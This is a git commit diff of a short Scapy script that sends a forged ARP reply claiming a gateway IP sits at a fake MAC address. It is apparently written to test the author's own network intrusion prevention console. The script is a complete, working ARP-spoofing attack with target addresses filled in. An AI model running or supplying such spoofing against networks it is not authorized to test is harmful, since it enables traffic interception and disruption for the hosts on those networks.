cbf16294b2b021dadc891f038fb2fd18adb3cf66
Richa Shanbhag <149705539+richashanbhag@users.noreply.github.com>
2025-11-09 19:42:17 +0530

    Update test_arp_direct.py

--- test_arp_direct.py
+++ test_arp_direct.py
@@ -1,27 +1,21 @@
 # test_arp_direct.py
 from scapy.all import sendp, ARP, Ether
 
-gateway_ip = "10.79.232.31"
+# --- CONFIG ---
+gateway_ip = "10.149.253.151"
+fake_mac = "00:11:22:33:44:55"
 
-# The MAC address we are faking
-fake_mac = "00:11:22:33:44:66"
-
-# The NIPS (Victim) PC's info (from your NIPS log)
-victim_ip = "10.79.232.131"
-victim_mac = "10:68:38:74:a0:bf"  # <-- From your NIPS "Learn" log
-
-# Your Attacker's interface
+# Your NIPS PC's info (from ipconfig /all)
+victim_ip = "10.149.253.131"
+victim_mac = "10-68-38-74-A0-BF"  # Your Physical Address
 ATTACKER_INTERFACE = "Wi-Fi"
-
+# --- END CONFIG ---
 
 print(f"Sending DIRECT fake ARP reply to {victim_ip}...")
 print(f"Claiming {gateway_ip} is at {fake_mac}")
-print(f"Sending on interface: {ATTACKER_INTERFACE}")
 
-
-
-packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=fake_mac)
+# Scapy needs colons for MAC addresses, not hyphens
+packet = Ether(dst=victim_mac.replace("-", ":")) / ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=fake_mac)
 
 sendp(packet, iface=ATTACKER_INTERFACE, verbose=False) 
-
 print("Fake packet sent! Check your NIPS console.")
